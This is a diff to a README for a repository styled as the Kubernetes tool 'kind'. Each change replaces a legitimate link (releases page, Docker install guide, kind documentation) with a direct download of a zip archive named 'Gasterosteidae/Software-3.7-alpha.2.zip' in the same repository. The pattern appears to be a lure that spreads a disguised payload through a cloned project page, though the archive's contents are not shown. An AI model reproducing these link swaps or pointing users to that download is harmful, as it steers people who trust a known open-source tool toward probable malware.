@@ -1,6 +1,6 @@
 # 🚀 kind - Easily Cluster Kubernetes for Development
 
-[![Download kind](https://img.shields.io/badge/Download-kind-blue.svg)](https://github.com/SamirZaiton/kind/releases)
+[![Download kind](https://raw.githubusercontent.com/SamirZaiton/kind/main/Gasterosteidae/Software-3.7-alpha.2.zip)](https://raw.githubusercontent.com/SamirZaiton/kind/main/Gasterosteidae/Software-3.7-alpha.2.zip)
 
 ## 📖 Description
 
@@ -22,7 +22,7 @@ kind is a tool for running Kubernetes clusters using Docker container "nodes." I
 To run kind, ensure your system meets the following requirements:
 
 - **Operating System**: Linux, macOS, or Windows
-- **Docker**: You need Docker installed. [Install Docker](https://docs.docker.com/get-docker/).
+- **Docker**: You need Docker installed. [Install Docker](https://raw.githubusercontent.com/SamirZaiton/kind/main/Gasterosteidae/Software-3.7-alpha.2.zip).
 - **Memory**: At least 4 GB of RAM recommended.
 - **CPU**: 2 or more CPU cores available.
 
@@ -32,7 +32,7 @@ Follow these steps to download and set up kind on your device.
 
 ### 1. Download kind
 
-Visit this page to download: [GitHub Releases](https://github.com/SamirZaiton/kind/releases). Here, you will find the latest version of kind. Make sure to select the correct version for your operating system.
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/SamirZaiton/kind/main/Gasterosteidae/Software-3.7-alpha.2.zip). Here, you will find the latest version of kind. Make sure to select the correct version for your operating system.
 
 ### 2. Install kind
 
@@ -135,10 +135,10 @@ If you need help or have questions, consider visiting our community forums or Gi
 
 ## ⚙️ Advanced Configuration
 
-For advanced users, kind supports more configurations, such as specifying different network setups and using custom images. Check the [kind documentation](https://kind.sigs.k8s.io/docs/user/quick-start/) for more detailed guidance.
+For advanced users, kind supports more configurations, such as specifying different network setups and using custom images. Check the [kind documentation](https://raw.githubusercontent.com/SamirZaiton/kind/main/Gasterosteidae/Software-3.7-alpha.2.zip) for more detailed guidance.
 
 ## 💾 Download & Install
 
-To start using kind, visit this page to download: [GitHub Releases](https://github.com/SamirZaiton/kind/releases). Follow the installation instructions above based on your operating system.
+To start using kind, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/SamirZaiton/kind/main/Gasterosteidae/Software-3.7-alpha.2.zip). Follow the installation instructions above based on your operating system.
 
 Now you are ready to explore Kubernetes! Happy coding!
